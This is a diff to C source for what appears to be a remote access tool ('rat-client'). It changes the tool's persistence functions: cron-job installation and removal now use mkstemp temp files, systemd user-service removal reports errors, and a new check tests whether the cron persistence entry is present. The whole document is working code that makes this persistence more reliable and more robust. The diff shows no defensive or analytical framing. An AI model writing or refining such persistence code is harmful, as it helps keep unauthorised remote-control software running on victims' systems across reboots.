@@ -111,14 +111,19 @@ int install_cron_job(const char *executable_path) {
     return -1; // Not supported on Windows
 #else
     char cron_entry[512];
-    char temp_file[256];
-    FILE *crontab_file;
     char command[1024];
+    FILE *crontab_file;
     
-    // Create temporary file with new cron entry
-    snprintf(temp_file, sizeof(temp_file), "/tmp/rat_cron_%d", getpid());
-    crontab_file = fopen(temp_file, "w");
+    // Create temporary file using mkstemp to avoid symlink race
+    char temp_template[] = "/tmp/rat_cron_XXXXXX";
+    int temp_fd = mkstemp(temp_template);
+    if (temp_fd == -1) {
+        return -1;
+    }
+    crontab_file = fdopen(temp_fd, "w");
     if (!crontab_file) {
+        close(temp_fd);
+        unlink(temp_template);
         return -1;
     }
     
@@ -128,15 +133,15 @@ int install_cron_job(const char *executable_path) {
     fclose(crontab_file);
     
     // Get existing crontab and append new entry
-    snprintf(command, sizeof(command), "crontab -l 2>/dev/null >> %s || true", temp_file);
+    snprintf(command, sizeof(command), "crontab -l 2>/dev/null >> %s || true", temp_template);
     system(command);
     
     // Install the new crontab
-    snprintf(command, sizeof(command), "crontab %s", temp_file);
+    snprintf(command, sizeof(command), "crontab %s", temp_template);
     int result = system(command);
     
     // Clean up temporary file
-    unlink(temp_file);
+    unlink(temp_template);
     
     return (result == 0) ? 0 : -1;
 #endif
@@ -284,18 +289,20 @@ int remove_systemd_service(void) {
     }
     
     // Stop and disable service
-    snprintf(command, sizeof(command), "systemctl --user stop rat-client.service && systemctl --user disable rat-client.service");
-    system(command);
+    snprintf(command, sizeof(command), "systemctl --user stop rat-client.service 2>/dev/null && systemctl --user disable rat-client.service 2>/dev/null");
+    int result = system(command);
     
     // Remove service file
     snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/rat-client.service", home_dir);
-    unlink(service_path);
+    if (unlink(service_path) != 0 && result == 0) {
+        result = -1;
+    }
     
     // Reload daemon
-    system("systemctl --user daemon-reload");
+    system("systemctl --user daemon-reload 2>/dev/null");
     
     free(home_dir);
-    return 0;
+    return result;
 #endif
 }
 
@@ -303,22 +310,26 @@ int remove_cron_job(void) {
 #ifdef _WIN32
     return -1;
 #else
-    char temp_file[256];
     char command[1024];
     
-    // Create temporary file for new crontab
-    snprintf(temp_file, sizeof(temp_file), "/tmp/rat_cron_clean_%d", getpid());
+    // Create temp file with mkstemp to avoid symlink race
+    char temp_template[] = "/tmp/rat_cron_clean_XXXXXX";
+    int temp_fd = mkstemp(temp_template);
+    if (temp_fd == -1) {
+        return -1;
+    }
+    close(temp_fd);
     
     // Get current crontab without our entry
-    snprintf(command, sizeof(command), "crontab -l 2>/dev/null | grep -v 'rat\\|client' > %s || true", temp_file);
+    snprintf(command, sizeof(command), "crontab -l 2>/dev/null | grep -v 'rat\\|client' > %s || true", temp_template);
     system(command);
     
     // Install cleaned crontab
-    snprintf(command, sizeof(command), "crontab %s", temp_file);
+    snprintf(command, sizeof(command), "crontab %s", temp_template);
     int result = system(command);
     
     // Clean up
-    unlink(temp_file);
+    unlink(temp_template);
     
     return (result == 0) ? 0 : -1;
 #endif
@@ -428,6 +439,17 @@ int check_persistence_status(PersistenceMethod method) {
             int exists = file_exists(service_path);
             free(home_dir);
             return exists;
+#endif
+        }
+        case PERSISTENCE_CRON: {
+#ifdef _WIN32
+            return 0;
+#else
+            // Check if our cron entry exists
+            FILE *fp = popen("crontab -l 2>/dev/null | grep -q 'rat'", "r");
+            if (!fp) return 0;
+            int found = pclose(fp);
+            return (found == 0) ? 1 : 0;
 #endif
         }
         case PERSISTENCE_AUTOSTART: {
